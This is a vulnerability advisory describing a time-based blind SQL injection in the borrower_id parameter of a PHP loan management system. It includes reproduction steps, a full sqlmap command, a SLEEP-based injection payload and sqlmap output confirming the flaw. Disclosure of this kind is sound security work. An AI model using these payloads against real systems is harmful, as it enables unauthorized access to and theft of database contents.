# SQL Injection in Loan Management System

## Overview

* **Vulnerability Type**: SQL Injection (Time-based Blind)
* **Vendor**: SourceCodester
* **Product**: [Loan Management System](https://www.sourcecodester.com/php/14471/loan-management-system-using-phpmysql-source-code.html)
* **Version**: 1.0
* **Component**: Save Loan functionality (`ajax.php?action=save_loan`)
* **Vulnerable Parameter**: `borrower_id` (POST)

## Description

A Time-based Blind SQL Injection vulnerability exists in **Loan Management System v1.0**. The vulnerability is located in the `ajax.php` file, specifically within the `save_loan` action handler.

The application fails to properly sanitize user input supplied to the `borrower_id` parameter in a POST request before using it in a SQL query. This allows an authenticated attacker to inject malicious SQL commands. By observing the server's response time (e.g., using `SLEEP()` commands), an attacker can infer data from the database byte-by-byte, leading to unauthorized data exfiltration.

## Steps to Reproduce

1. **Setup**: Deploy the Loan Management System locally.
2. **Login**: Log in to the application as an administrator (Default credentials are usually `admin` / `admin123`).
3. **Navigate**: Go to the "Loans" section and attempt to create a new loan.
4. **Capture Request**: Click "Save" and intercept the POST request using a proxy tool (like Burp Suite). The endpoint is `ajax.php?action=save_loan`.
5. **Exploit**: Run `sqlmap` against the target URL using the captured cookie and the vulnerable `borrower_id` parameter.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8082/ajax.php?action=save_loan" --data "id=&borrower_id=1&loan_type_id=1&plan_id=3&amount=5000&purpose=Business+expansion+loan" -H "X-Requested-With: XMLHttpRequest" -H "Referer: http://127.0.0.1:8082/index.php?page=loans" --batch -v 6 --risk=3 --cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Time-Based Blind Payload:**

```sql
id=&borrower_id=1 AND (SELECT 2457 FROM (SELECT(SLEEP(5)))LelR)&loan_type_id=1&plan_id=3&amount=5000&purpose=Business expansion loan

```

## Proof of Concept

The following output from `sqlmap` confirms that the `borrower_id` parameter is vulnerable to Time-based Blind SQL injection:

```text
sqlmap identified the following injection point(s) with a total of 191 HTTP(s) requests:
---
Parameter: borrower_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=&borrower_id=1 AND (SELECT 2457 FROM (SELECT(SLEEP(5)))LelR)&loan_type_id=1&plan_id=3&amount=5000&purpose=Business expansion loan
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[INFO] the back-end DBMS is MySQL
[INFO] [PAYLOAD] 1 AND (SELECT 9316 FROM (SELECT(SLEEP(5-(IF(VERSION() LIKE 0x254d61726961444225,0,5)))))jRYV)

```

<img width="989" height="218" alt="图片" src="https://github.com/user-attachments/assets/e3fca71f-3903-4215-aa8f-eb55c2c0db8a" />


## Impact

This vulnerability allows an authenticated attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the database (e.g., admin credentials, borrower details) by inferring data character by character.
2. **Database Enumeration**: Identify database structure, tables, and columns.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14471/loan-management-system-using-phpmysql-source-code.html)
